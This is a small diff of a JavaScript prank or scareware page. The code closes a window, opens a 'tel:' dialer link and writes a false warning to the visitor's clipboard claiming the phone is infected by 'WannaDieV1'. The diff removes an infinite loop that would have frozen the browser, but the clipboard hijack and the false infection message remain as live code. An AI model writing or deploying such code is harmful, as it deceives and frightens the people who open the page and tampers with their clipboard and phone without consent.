@@ -214,9 +214,8 @@ let myWindow;
 
   myWindow.close();
   window.open('tel:UrMom');
-for(let i = 1; i > 0; i++) {
+
     navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
-  }
   
   
 }else{
